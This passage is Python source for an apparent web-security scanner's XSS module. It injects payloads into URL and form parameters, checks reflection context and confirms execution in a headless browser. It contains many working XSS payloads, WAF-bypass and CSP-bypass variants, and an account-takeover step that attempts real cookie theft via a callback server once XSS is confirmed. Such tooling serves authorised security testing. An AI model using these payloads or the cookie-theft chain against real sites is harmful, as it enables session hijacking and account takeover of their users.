import html
import logging
import random
import re
import string
import time
import uuid
from dataclasses import dataclass
from enum import Enum, auto
from typing import Any, Callable, List, Dict, Optional, Tuple, TYPE_CHECKING
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests as _requests

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator

if TYPE_CHECKING:  # forward-ref only; no runtime import (avoids cycle)
    from websecure.core.xss_callback import CapturedSession

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Reflection Quality Scorer (Plan B — B4)
# ---------------------------------------------------------------------------

class ReflectionQualityScorer:
    """
    Scores the quality / exploitability of an XSS reflection.

    Returns a dict:
      score     — 0.0–1.0 composite exploitability signal
      escaped   — list of chars that were HTML-encoded (evidence of sanitisation)
      raw       — list of chars that survived unescaped (evidence of vulnerability)
      context   — detected HTML context string
      severity  — High / Medium / Low derived from score
      detail    — human-readable evidence string
    """

    # Characters critical for XSS payloads to execute
    _CRITICAL_CHARS: Dict[str, str] = {
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;",
        "/": "&#x2f;",
        "`": "&#x60;",
    }

    # Context scoring — how dangerous is each reflection context
    _CONTEXT_SCORES: Dict[str, float] = {
        "script":      1.0,   # direct JS execution
        "attr_double": 0.85,  # break out of attribute
        "attr_single": 0.85,
        "attr":        0.85,
        "html":        0.75,  # inject new tags
        "style":       0.60,  # CSS expression / tag break
        "comment":     0.50,  # break out of comment
    }

    @classmethod
    def score(
        cls,
        payload: str,
        response_text: str,
        context: str,
        baseline_text: str = "",
    ) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "score": 0.0,
            "escaped": [],
            "raw": [],
            "context": context,
            "severity": "Low",
            "detail": "",
        }

        if not payload or payload not in response_text:
            return result

        # Don't count if payload already in baseline (static content)
        if baseline_text and payload in baseline_text:
            return result

        # Find reflection position
        pos = response_text.find(payload)
        window = response_text[max(0, pos - 50): pos + len(payload) + 50]

        # Score each critical character
        char_score = 0.0
        for char, entity in cls._CRITICAL_CHARS.items():
            if char not in payload:
                continue
            # Check if the char appears encoded in the window
            encoded = any(
                enc.lower() in window.lower()
                for enc in [entity, f"%{ord(char):02x}", f"%{ord(char):02X}"]
            )
            if encoded:
                result["escaped"].append(char)
            else:
                result["raw"].append(char)
                char_score += 1.0 / max(len([c for c in cls._CRITICAL_CHARS if c in payload]), 1)

        # Context score
        ctx_score = cls._CONTEXT_SCORES.get(context, 0.50)

        # Executable indicator bonus
        exec_bonus = 0.0
        if re.search(r"<\s*script|on\w+\s*=|javascript:", window, re.I):
            exec_bonus = 0.15

        composite = min(char_score * 0.50 + ctx_score * 0.35 + exec_bonus, 1.0)
        result["score"] = round(composite, 3)

        if composite >= 0.75:
            result["severity"] = "High"
        elif composite >= 0.50:
            result["severity"] = "Medium"
        else:
            result["severity"] = "Low"

        escaped_str = f"escaped={result['escaped']}" if result["escaped"] else ""
        raw_str     = f"raw={result['raw']}"         if result["raw"]     else ""
        result["detail"] = (
            f"Reflection quality: score={composite:.2f} ctx={context} "
            + " ".join(filter(None, [raw_str, escaped_str]))
        )
        return result

# ---------------------------------------------------------------------------
# HTML-context executability check
# ---------------------------------------------------------------------------

# Characters that must survive unescaped for an XSS payload to be executable.
# Mapping: dangerous char -> its HTML entity encodings
_DANGEROUS_CHARS: Dict[str, List[str]] = {
    "<":  ["&lt;", "&#60;", "&#x3c;", "&#x3C;", "%3c", "%3C"],
    ">":  ["&gt;", "&#62;", "&#x3e;", "&#x3E;", "%3e", "%3E"],
    '"':  ["&quot;", "&#34;", "&#x22;", "%22"],
    "'":  ["&#39;", "&#x27;", "&apos;", "%27"],
}

# Chars that indicate an executable payload based on the payload type
_SCRIPT_INDICATORS  = re.compile(r"<\s*script", re.I)
_EVENT_INDICATORS   = re.compile(r"\bon\w+\s*=", re.I)
_HREF_INDICATORS    = re.compile(r"href\s*=\s*['\"]?\s*javascript:", re.I)
_SRC_INDICATORS     = re.compile(r"src\s*=\s*['\"]?\s*javascript:", re.I)


def _detect_reflection_context(html_text: str, canary: str) -> str:
    """
    Detect where `canary` appears in the HTML and return a context label:
      'script'    — inside a <script>...</script> block
      'attr'      — inside an HTML attribute value (quoted or unquoted)
      'comment'   — inside <!-- ... -->
      'style'     — inside a <style>...</style> block
      'html'      — bare HTML text node (default)

    Knowing the context lets us pick payloads most likely to execute
    without having to try every variant.
    """
    if not canary or canary not in html_text:
        return "html"

    pos = html_text.find(canary)
    # Inspect the 300 chars before the canary
    before = html_text[max(0, pos - 300): pos]

    # Inside a script block?
    last_open_script  = before.rfind("<script")
    last_close_script = before.rfind("</script")
    if last_open_script > last_close_script:
        return "script"

    # Inside a style block?
    last_open_style  = before.rfind("<style")
    last_close_style = before.rfind("</style")
    if last_open_style > last_close_style:
        return "style"

    # Inside an HTML comment?
    last_open_comment  = before.rfind("<!--")
    last_close_comment = before.rfind("-->")
    if last_open_comment > last_close_comment:
        return "comment"

    # Inside an attribute value? (look for unmatched quote after last tag open)
    last_tag_start = before.rfind("<")
    if last_tag_start != -1:
        tag_section = before[last_tag_start:]
        # Count quotes — if odd number of " or ' -> we're inside an attribute value
        if tag_section.count('"') % 2 == 1:
            return "attr_double"
        if tag_section.count("'") % 2 == 1:
            return "attr_single"

    return "html"


# Context-optimised payload sets (short lists — tried FIRST before the wordlist)
_CTX_PAYLOADS: Dict[str, List[str]] = {
    "script": [
        # Already inside JS — just close the string/expression
        "';alert(1);//",
        "\";alert(1);//",
        "</script><script>alert(1)</script>",
        "`;alert(1);//",
        "-alert(1)-",
        "\\';alert(1);//",
    ],
    "attr_double": [
        "\" onmouseover=\"alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "\" onload=\"alert(1)",
        "\"><img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
    ],
    "attr_single": [
        "' onmouseover='alert(1)",
        "' autofocus onfocus='alert(1)",
        "'><img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>",
    ],
    "comment": [
        "-->alert(1)<!--",
        "--><script>alert(1)</script><!--",
        "--><img src=x onerror=alert(1)><!--",
    ],
    "style": [
        "</style><script>alert(1)</script>",
        "expression(alert(1))",
        "</style><img src=x onerror=alert(1)>",
    ],
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<details open ontoggle=alert(1)>",
    ],
}


def _context_payloads(context: str) -> List[str]:
    """Return the high-priority payloads for the detected context."""
    return list(_CTX_PAYLOADS.get(context, _CTX_PAYLOADS["html"]))


def _is_xss_executable(payload: str, response_text: str) -> bool:
    """
    Return True only when the reflected payload retains its dangerous characters
    in an unescaped form that a browser would actually execute.

    Logic:
    1. Find the exact reflected occurrence of `payload` in `response_text`.
    2. For each dangerous character present in `payload`, verify it appears
       as a raw character (not as an HTML entity) in the surrounding context.
    3. Additionally require that the reflection context contains an executable
       indicator (<script, on*=, javascript:) with unescaped angle brackets or
       unquoted event handlers.

    A payload like `<script>alert(1)</script>` reflected as
    `&lt;script&gt;alert(1)&lt;/script&gt;` returns False.
    The same payload reflected literally returns True.
    """
    if not payload or payload not in response_text:
        return False

    # Collect which dangerous chars appear in the payload
    relevant_chars = [c for c in _DANGEROUS_CHARS if c in payload]
    if not relevant_chars:
        # Payload has no angle brackets / quotes (e.g. pure JS like alert(1))
        # — still reflected, no encoding concern
        return True

    # Find the reflection position and inspect a window around it
    pos = response_text.find(payload)
    window_start = max(0, pos - 20)
    window_end   = min(len(response_text), pos + len(payload) + 20)
    window        = response_text[window_start:window_end]

    for char in relevant_chars:
        # Check: does the window contain the char's entity form instead of raw char?
        for entity in _DANGEROUS_CHARS[char]:
            if entity.lower() in window.lower():
                # Found encoded form — this char is sanitised; payload won't execute
                logger.debug(
                    f"[XSS] Payload reflected but '{char}' is HTML-encoded "
                    f"(found '{entity}') — skipping false positive"
                )
                return False

    # Payload is reflected with raw dangerous chars — confirm an executable context
    has_exec_context = (
        _SCRIPT_INDICATORS.search(window)
        or _EVENT_INDICATORS.search(window)
        or _HREF_INDICATORS.search(window)
        or _SRC_INDICATORS.search(window)
    )
    if not has_exec_context:
        # Reflected inside plain text node or attribute value without event handler
        logger.debug(
            "[XSS] Payload reflected with raw chars but no executable context detected "
            "— flagging as medium-confidence"
        )
        # Still return True — a penetration tester should verify; we just lower confidence
        # via the caller (dom_verify step will confirm or deny execution)
    return True


class XSSScanner(BaseScanner):
    """
    Robust Cross-Site Scripting (XSS) Scanner.
    Features:
    - Reflected XSS detection via canary with baseline comparison
    - Context-aware payload selection
    - WAF Evasion/Polyglot support
    - Parallel payload testing via BaseScanner.run_parallel_probes()
    """

    name = "xss"
    phase = "offensive"

    MAX_WORKERS = 6        # parallel threads
    MAX_URL_PAYLOADS = 200 # tüm wordlist denenir (yüksek kapsamlı)
    MAX_FORM_PAYLOADS = 50 # form input'ları için de tam kapsam

    def __init__(self, session=None, results: Dict = None, debug=False, oast_domain: str = None):
        super().__init__(session, results, debug)
        self.canary_prefix = "wsxss"
        self._seen_url_params: set = set()   # (normalized_url, param_name) — test edilenleri izle
        self._oast_domain: Optional[str] = oast_domain

        # Context-aware payload sets — tried first before the wordlist
        self._context_payloads: Dict[str, List[str]] = {
            "script": [
                "</script><script>alert(document.domain)</script>",
                "';alert(document.domain)//",
                "\";alert(document.domain)//",
                "`;alert(document.domain)//",
                "-alert(document.domain)-",
                "'+alert(document.domain)+'",
                "\"+alert(document.domain)+\"",
                "javascript:alert(document.domain)",
            ],
            "attr": [
                "\" onmouseover=\"alert(document.domain)",
                "' onmouseover='alert(document.domain)",
                "\" autofocus onfocus=\"alert(document.domain)",
                "\" onload=\"alert(document.domain)",
                "\"><img src=x onerror=alert(document.domain)>",
                "\"><svg onload=alert(document.domain)>",
                "\" style=\"animation-name:x\" onanimationstart=\"alert(document.domain)",
            ],
            "html": [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg onload=alert(document.domain)>",
                "<body onload=alert(document.domain)>",
                "<details open ontoggle=alert(document.domain)>",
                "<video src=1 onerror=alert(document.domain)>",
                "<audio src=1 onerror=alert(document.domain)>",
                "<iframe srcdoc=\"<script>alert(parent.document.domain)</script>\">",
                "<input autofocus onfocus=alert(document.domain)>",
                "<select autofocus onfocus=alert(document.domain)>",
                "<textarea autofocus onfocus=alert(document.domain)>",
                "<!--<img src=--><img src=x onerror=alert(document.domain)//>",
            ],
            "comment": [
                "--><script>alert(document.domain)</script>",
                "--><img src=x onerror=alert(document.domain)>",
                "--><svg onload=alert(document.domain)>",
            ],
            "style": [
                "}</style><script>alert(document.domain)</script>",
                "expression(alert(document.domain))",
                "</style><img src=x onerror=alert(document.domain)>",
            ],
            # attr_double / attr_single map to "attr" semantics
            "attr_double": [
                "\" onmouseover=\"alert(document.domain)",
                "\" autofocus onfocus=\"alert(document.domain)",
                "\" onload=\"alert(document.domain)",
                "\"><img src=x onerror=alert(document.domain)>",
                "\"><svg onload=alert(document.domain)>",
            ],
            "attr_single": [
                "' onmouseover='alert(document.domain)",
                "' autofocus onfocus='alert(document.domain)",
                "'><img src=x onerror=alert(document.domain)>",
                "'><svg onload=alert(document.domain)>",
            ],
        }

        # WAF bypass payload variants
        self._waf_bypass_payloads: List[str] = [
            "<ScRiPt>alert(document.domain)</ScRiPt>",
            "<SCRIPT>alert(document.domain)</SCRIPT>",
            "<img src=x OnErRoR=alert(document.domain)>",
            "<svg/onload=alert(document.domain)>",
            "<svg\tonload=alert(document.domain)>",
            "<svg\nonload=alert(document.domain)>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=alert`1`>",
            "<img src=x onerror=alert(1)//",
            "<details/open/ontoggle=alert(document.domain)>",
            "<marquee onstart=alert(document.domain)>",
            "<isindex type=image src=1 onerror=alert(document.domain)>",
            "<object data=javascript:alert(document.domain)>",
            "<embed src=javascript:alert(document.domain)>",
            "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//\\x3e",
            "\"><img src=x onerror=alert(document.domain)><\"",
        ]

    def _gen_canary(self) -> str:
        # Include hyphens so the canary cannot be a valid Base32/Base64/hex string
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        uid = str(uuid.uuid4())[:4]
        return f"{self.canary_prefix}-{token}-{uid}"

    def _get_baseline(self, url: str, params: dict) -> Tuple[str, int]:
        """Orijinal parametrelerle baseline response al."""
        try:
            r = self.session.get(url, params=params, timeout=10, allow_redirects=True)
            return r.text, r.status_code
        except Exception:
            return "", 0

    def _verify_xss_reflection(self, response_text: str, payload: str, context: str) -> Dict:
        """
        Payload'ın response'da nasıl yansıdığını analiz et.
        Returns: {"reflected": bool, "encoded": bool, "executable": bool, "confidence": str}
        """
        result: Dict = {
            "reflected": False,
            "encoded": False,
            "executable": False,
            "confidence": "none",
        }

        if not payload:
            return result

        if payload not in response_text:
            # Entity-encoded reflection kontrolü
            encoded_form = html.escape(payload)
            if encoded_form != payload and encoded_form in response_text:
                result["reflected"] = True
                result["encoded"] = True
                result["confidence"] = "low"  # encoded = sanitized = not exploitable
            return result

        result["reflected"] = True

        # Payload execute edilebilir mi? Context'e göre kontrol et
        if context == "script":
            if any(c in response_text for c in ["alert(", "alert`", "onerror=", "onload="]):
                result["executable"] = True
                result["confidence"] = "high"
            else:
                result["confidence"] = "medium"
        elif context in ("html", "comment"):
            if re.search(
                r'<\s*(script|img|svg|iframe|object|embed|video|audio|details)',
                response_text,
                re.I,
            ):
                result["executable"] = True
                result["confidence"] = "high"
            elif "<" in response_text and ">" in response_text:
                result["confidence"] = "medium"
            else:
                result["encoded"] = True
                result["confidence"] = "low"
        elif context in ("attr", "attr_double", "attr_single"):
            if re.search(r'on\w+\s*=\s*["\']?alert', response_text, re.I):
                result["executable"] = True
                result["confidence"] = "high"
            elif '"' in response_text or "'" in response_text:
                result["confidence"] = "medium"
            else:
                result["confidence"] = "low"
        elif context == "style":
            if re.search(r'(</style>|expression\s*\()', response_text, re.I):
                result["executable"] = True
                result["confidence"] = "high"
            else:
                result["confidence"] = "medium"
        else:
            # Default: reflected but context unknown
            result["confidence"] = "medium"

        return result

    def run(self, url, results: Dict = None, **kwargs):
        if results is not None:
            self.results = results

        urls = url if isinstance(url, list) else [url]
        for u in urls:
            self.scan_url(u)

        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            if all_forms:
                self.scan_forms(all_forms)

        # --- Adım 4 eklentileri -------------------------------------------
        self._run_advanced_xss_phase(urls)

    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"[XSS] Scanning URL params: {url}")

        # Baseline — uses BaseScanner.fetch_baseline() (proper error logging)
        baseline_resp = self.fetch_baseline(url, timeout=8)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for param_name, _ in params:
            canary = self._gen_canary()
            if canary in baseline_text:
                continue

            invoked = self.inject_param(url, param_name, canary)
            try:
                probe_res = self.session.get(invoked, timeout=8)
                if canary not in probe_res.text:
                    continue  # param not reflected, no point fuzzing
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[XSS] Canary probe timed out for {invoked}: {exc!r}")
                continue
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[XSS] Canary probe connection error for {invoked}: {exc!r}")
                continue
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[XSS] Canary probe failed for {invoked}: {exc!r}")
                continue

            # Detect HTML context — choose context-appropriate payloads
            ctx = _detect_reflection_context(probe_res.text, canary)

            # Dedup: skip (url, param) combinations already tested this run
            combo_key = (url.split("?")[0], param_name)
            if combo_key in self._seen_url_params:
                continue
            self._seen_url_params.add(combo_key)

            # Parameter reflects input — fuzz with context-aware payloads
            self._fuzz_xss_parallel(url, param_name, baseline_text, context=ctx)

    def _fuzz_xss_parallel(self, url: str, param_name: str, baseline_text: str,
                           context: str = "html"):
        base_payloads = self.get_smart_payloads("xss", param_name)
        if not base_payloads:
            base_payloads = [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
            ]

        # Context-aware payload selection — use richer self._context_payloads first,
        # then fall back to the module-level _CTX_PAYLOADS helper for compatibility.
        ctx_specific = self._context_payloads.get(context, self._context_payloads.get("html", []))
        ctx_legacy = _context_payloads(context)
        ctx_combined = list(ctx_specific)
        for p in ctx_legacy:
            if p not in ctx_combined:
                ctx_combined.append(p)

        # Add WAF bypass payloads after context-specific ones
        waf_payloads = [p for p in self._waf_bypass_payloads if p not in ctx_combined]

        payloads = ctx_combined + waf_payloads + [
            p for p in list(base_payloads)
            if p not in ctx_combined and p not in waf_payloads
        ]
        payloads = payloads + Mutator.mutate_polyglot("alert(1)")
        if len(payloads) > self.MAX_URL_PAYLOADS:
            # Always keep the context-specific + WAF bypass ones; sample from the rest
            keep_n = len(ctx_combined) + len(waf_payloads)
            keep = payloads[:keep_n]
            rest_pool = payloads[keep_n:]
            sample_n = min(self.MAX_URL_PAYLOADS - keep_n, len(rest_pool))
            rest = random.sample(rest_pool, sample_n) if sample_n > 0 else []
            payloads = keep + rest

        def probe(payload: str) -> Optional[Dict]:
            actual = payload
            if random.random() < 0.2:
                mutated = Mutator.mutate_xss(payload)
                actual = random.choice(mutated) if mutated else payload

            invoked = self.inject_param(url, param_name, actual)
            try:
                res = self.session.get(invoked, timeout=8)
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[XSS] Probe timed out for {invoked}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[XSS] Probe connection error for {invoked}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[XSS] Probe request failed for {invoked}: {exc!r}")
                return None

            # Baseline status code comparison: if both baseline and response are 404 -> FP
            if res.status_code == 404:
                baseline_status = 0
                try:
                    bl = self.session.get(url, timeout=8)
                    baseline_status = bl.status_code
                except Exception as _fix_e:
                    logger.debug(f"[scanners.xss] {type(_fix_e).__name__}: {_fix_e!r}")
                if baseline_status == 404:
                    return None  # both 404 -> false positive

            # Use _verify_xss_reflection for precise reflection analysis
            reflection = self._verify_xss_reflection(res.text, actual, context)

            if not reflection["reflected"]:
                return None

            # Payload XSS-capable chars içermiyorsa (base32/random string echo) FP'dir
            if not re.search(r'[<>\'\"=\(\)\{\}\$`;]', actual):
                return None  # Sadece alfanümerik string yansıması — gerçek XSS değil

            if reflection["encoded"]:
                logger.debug(f"[XSS] Payload encoded in response — skipping: {actual[:50]!r}")
                return None
            if reflection["confidence"] == "none":
                return None

            # Additional check: payload must not be in baseline
            if actual in baseline_text:
                return None

            # Legacy executable guard for extra safety
            if not _is_xss_executable(actual, res.text):
                return None

            # Plan B (B4): Reflection quality scoring — enriches evidence chain
            rq = ReflectionQualityScorer.score(actual, res.text, context, baseline_text)
            # Drop very low quality reflections (all chars escaped = sanitised)
            if rq["escaped"] and not rq["raw"]:
                logger.debug(
                    f"[XSS] All dangerous chars escaped in reflection — suppressing: {actual[:50]!r}"
                )
                return None

            return {
                "vuln_type": "Reflected XSS",
                "url": url,
                "param": param_name,
                "payload": actual,
                "detection_method": "reflection",
                "confidence": reflection["confidence"],
                "_executable": reflection["executable"],
                "_rq_score": rq["score"],
                "_rq_detail": rq["detail"],
                "_rq_severity": rq["severity"],
            }

        hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
        ato_gen = XSSToATOChain()
        for hit in hits:
            dom_confirmed = self._dom_verify_xss(url, param_name, hit.get("payload", ""))
            hit_confidence = hit.get("confidence", "medium")
            executable = hit.pop("_executable", False)
            rq_score  = hit.pop("_rq_score",   0.0)
            rq_detail = hit.pop("_rq_detail",  "")
            rq_sev    = hit.pop("_rq_severity", "Low")

            # Severity: DOM confirmation > quality score > confidence > executable flag
            if dom_confirmed:
                severity = "High"
            elif rq_score >= 0.75 or (hit_confidence == "high" and executable):
                severity = "High"
            elif rq_score >= 0.50 or hit_confidence == "medium":
                severity = "Medium"
            else:
                severity = "Low"

            if dom_confirmed:
                evidence_str = "Payload reflected + Playwright DOM execution CONFIRMED"
            else:
                evidence_str = (
                    f"Payload reflected (confidence={hit_confidence}, executable={executable})"
                    + (f" | {rq_detail}" if rq_detail else "")
                    + " — DOM unconfirmed, manual check recommended"
                )

            self.report_finding(
                severity=severity,
                evidence=evidence_str,
                verified=dom_confirmed,
                confidence="high" if dom_confirmed else hit_confidence,
                detection_method=hit.get("detection_method", "reflection"),
                reflection_quality=round(rq_score, 3),
                **{k: v for k, v in hit.items() if k not in ("confidence", "detection_method")},
            )
            # XSS -> ATO: DOM onaylıysa gerçek cookie theft dene
            if dom_confirmed:
                xss_payload_used = hit.get("payload", "")
                # 1. Gerçek execution — callback server ile cookie theft
                captured = ato_gen.execute(
                    xss_url=url,
                    param=param_name,
                    xss_payload=xss_payload_used,
                    results=self.results,
                )
                # 2. Bulguya ATO bilgisini ekle (gerçek capture veya PoC)
                ato = ato_gen.generate_poc(url, param_name, xss_payload_used)
                ato["verified"] = True
                ato["detection_method"] = "dom_playwright"
                ato["ato_executed"] = captured is not None
                ato["ato_verified"] = captured.verified if captured else False
                if captured:
                    ato["ato_cookie_count"] = len(captured.cookies)
                    ato["ato_ls_keys"] = len(captured.local_storage)
                    ato["ato_raw_cookie"] = captured.raw_cookie_str[:200]
                self.report_finding(severity="Critical", **ato)

    def _dom_verify_xss(self, url: str, param_name: str, payload: str) -> bool:
        """
        Playwright ile XSS'i DOM'da doğrular: window.__xss_confirmed ayarlanmışsa True döner.
        Playwright yoksa veya hata alınırsa sessizce False döner.
        """
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            logger.debug("[XSS] Playwright yüklü değil; DOM doğrulaması atlandı")
            return False

        # Onay payload'u: alert(1) yerine window.__xss_confirmed=1 yaz
        confirm_payload = (
            payload
            .replace("alert(1)", "window.__xss_confirmed=1")
            .replace("confirm(1)", "window.__xss_confirmed=1")
            .replace("prompt(1)", "window.__xss_confirmed=1")
        )
        if "window.__xss_confirmed" not in confirm_payload:
            confirm_payload = '<img src=x onerror="window.__xss_confirmed=1">'

        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[param_name] = confirm_payload
        test_url = urlunparse(parsed._replace(query=urlencode(params)))

        try:
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                page.wait_for_timeout(1500)
                confirmed = page.evaluate("() => !!window.__xss_confirmed")
                browser.close()
                return bool(confirmed)
        except Exception as exc:
            logger.debug(f"[XSS] DOM doğrulama hatası ({test_url}): {exc!r}")
            return False

    # --- Adım 4: Advanced XSS Integration --------------------------------

    def _inject_param_fn(self, url: str, param: str, payload: str) -> str:
        """Adapter: wraps inject_param for use as Callable by standalone probers."""
        return self.inject_param(url, param, payload)

    def _run_advanced_xss_phase(self, urls: List[str]) -> None:
        """
        Orchestrates Adım 4 advanced XSS probers:
        mXSS, DOM Clobbering, CSP bypass, Trusted Types,
        Prototype Pollution, Template Literal, Blind XSS, XSS->ATO.
        """
        mxss_prober    = MutationXSSProber()
        clobber_prober = DOMClobberingProber()
        csp_analyzer   = CSPAnalyzer()
        tt_prober      = TrustedTypesBypassProber()
        pp_prober      = PrototypePollutionXSSProber()
        tl_prober      = TemplateLiteralInjectionProber()
        blind_prober   = BlindXSSProber(oob_host=self._oast_domain)
        ato_gen        = XSSToATOChain()

        for url in urls[:10]:
            parsed = urlparse(url)
            params = [p for p, _ in parse_qsl(parsed.query)]
            if not params:
                continue

            # CSP analysis — one GET per URL
            csp_info: Dict[str, Any] = {"present": False}
            csp_bypasses: List[str] = []
            try:
                resp0 = self.session.get(url, timeout=8)
                csp_info = csp_analyzer.analyze(resp0)
                csp_bypasses = csp_analyzer.get_bypass_payloads(csp_info)
                if csp_bypasses:
                    logger.info("[XSS] CSP detected on %s -> %d bypass payloads", url, len(csp_bypasses))
            except Exception as _fix_e:
                logger.debug(f"[scanners.xss] {type(_fix_e).__name__}: {_fix_e!r}")

            # Prototype pollution — URL-level, no specific param
            for f in pp_prober.probe(url, self.session):
                self.report_finding(severity="High", confidence="medium", detection_method="proto_pollution", **{k: v for k, v in f.items() if k not in ("confidence", "detection_method")})

            for param in params[:5]:
                inject_fn = self._inject_param_fn

                # mXSS
                for f in mxss_prober.probe(url, param, self.session, inject_fn):
                    self.report_finding(severity="High", confidence="medium", detection_method="mxss", **{k: v for k, v in f.items() if k not in ("confidence", "detection_method")})

                # DOM Clobbering
                for f in clobber_prober.probe(url, param, self.session, inject_fn):
                    self.report_finding(severity="Medium", confidence="low", detection_method="dom_clobbering", **{k: v for k, v in f.items() if k not in ("confidence", "detection_method")})

                # CSP bypass payloads
                for payload in csp_bypasses[:6]:
                    try:
                        injected = inject_fn(url, param, payload)
                        r = self.session.get(injected, timeout=8)
                        if payload in r.text:
                            finding = {
                                "vuln_type": "CSP Bypass XSS",
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "evidence": f"CSP bypass reflected; policy: {csp_info.get('raw','')[:100]}",
                            }
                            self.report_finding(severity="High", confidence="medium", detection_method="csp_bypass", **finding)
                            # Generate ATO PoC for confirmed CSP bypass.
                            # BUG FIX: generate_poc() dict contains "severity" and other
                            # keys that conflict with report_finding() explicit keyword args.
                            # Extract only what we need instead of blind **unpacking.
                            ato = ato_gen.generate_poc(url, param, payload)
                            self.report_finding(
                                vuln_type=ato.get("vuln_type", "XSS -> Account Takeover (PoC)"),
                                url=url,
                                param=param,
                                payload=payload,
                                severity="Critical",
                                confidence=ato.get("confidence", "high"),
                                extra={
                                    "pocs": ato.get("pocs", {}),
                                    "attacker_host": ato.get("attacker_host", ""),
                                    "session_id": ato.get("session_id", ""),
                                    "ato_source": "csp_bypass",
                                },
                            )
                    except Exception as _csp_exc:
                        logger.debug(f"[XSS] CSP bypass PoC reporting failed for {url}: {_csp_exc!r}")

                # Trusted Types bypass
                for f in tt_prober.probe(url, param, self.session, inject_fn):
                    self.report_finding(severity="Medium", confidence="low", detection_method="trusted_types", **{k: v for k, v in f.items() if k not in ("confidence", "detection_method")})

                # Template literal injection
                for f in tl_prober.probe(url, param, self.session, inject_fn):
                    sev = "High" if f.get("confidence") == "high" else "Medium"
                    self.report_finding(severity=sev, detection_method="template_literal", **{k: v for k, v in f.items() if k not in ("detection_method",)})

                # Blind XSS (OOB)
                for f in blind_prober.probe(url, param, self.session, inject_fn):
                    self.report_finding(severity="High", detection_method="blind_xss_oob", **{k: v for k, v in f.items() if k not in ("detection_method",)})

    def scan_forms(self, forms: List[Dict]):
        logger.info(f"[XSS] Scanning {len(forms)} forms...")
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                continue

            skipped = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped]

            # Form baseline — uses fetch_baseline() with proper logging
            base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
            baseline_resp = self.fetch_baseline(action, method=method, data=base_data, timeout=8)
            baseline_text = baseline_resp.text if baseline_resp else ""

            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name:
                    continue
                self._fuzz_form_param_parallel(
                    action, method, inputs, p_name, baseline_text
                )

    def _fuzz_form_param_parallel(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        p_name: str,
        baseline_text: str,
    ):
        payloads = self.get_smart_payloads("xss", p_name)
        if not payloads:
            payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
        payloads = payloads[:self.MAX_FORM_PAYLOADS]
        base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}

        def probe(payload: str) -> Optional[Dict]:
            form_data = dict(base_data)
            form_data[p_name] = payload
            req_kw = self.prepare_injection(action, p_name, payload, method, data=form_data)
            try:
                if method == "POST":
                    res = self.session.post(
                        req_kw.get("url", action),
                        data=req_kw.get("data"),
                        timeout=8,
                    )
                else:
                    res = self.session.get(req_kw.get("url", action), timeout=8)
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[XSS] Form probe timed out for {action}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[XSS] Form probe connection error for {action}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[XSS] Form probe failed for {action}: {exc!r}")
                return None

            if payload in baseline_text:
                return None

            # Detect reflection context then use strict verification
            form_context = _detect_reflection_context(res.text, payload)
            reflection = self._verify_xss_reflection(res.text, payload, form_context)

            if not reflection["reflected"]:
                return None
            if reflection["encoded"]:
                return None
            if reflection["confidence"] == "none":
                return None
            if not _is_xss_executable(payload, res.text):
                return None

            return {
                "vuln_type": "Reflected XSS (Form)",
                "url": action,
                "param": p_name,
                "payload": payload,
                "detection_method": "reflection_form",
                "confidence": reflection["confidence"],
                "_executable": reflection["executable"],
            }

        hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
        for hit in hits:
            executable = hit.pop("_executable", False)
            hit_confidence = hit.get("confidence", "low")
            if hit_confidence == "high" and executable:
                severity = "High"
            elif hit_confidence == "medium":
                severity = "Medium"
            else:
                severity = "Low"
            self.report_finding(
                severity=severity,
                evidence=(
